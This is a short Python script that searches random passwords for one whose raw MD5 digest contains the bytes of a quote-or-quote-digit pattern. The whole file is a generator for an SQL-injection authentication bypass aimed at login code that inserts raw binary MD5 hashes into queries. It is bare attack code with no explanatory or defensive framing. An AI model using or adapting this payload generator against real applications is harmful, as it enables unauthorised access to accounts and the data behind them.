import hashlib
import sys
from random import randint

# generate random password
def rand():
    return str(randint(0, sys.maxint))
def get_pass():
    return rand() + rand() + rand() + rand()

def get_hash():
    # ['or', 'Or','OR', 'oR', '||']
    start = ['276f7227','274f7227','274f5227','276f5227','277c7c27']
    possibly = []

    # followed by 1:9
    for sub in start:
        for i in range(31,40):
            possibly.append(sub + str(i))

    while 1:
        password = get_pass()
        passhash = hashlib.md5(password).hexdigest()
        if any(sub in passhash for sub in start):
            if any(sub in passhash for sub in possibly):
                print(password + ' : ' + passhash)
                return

get_hash()

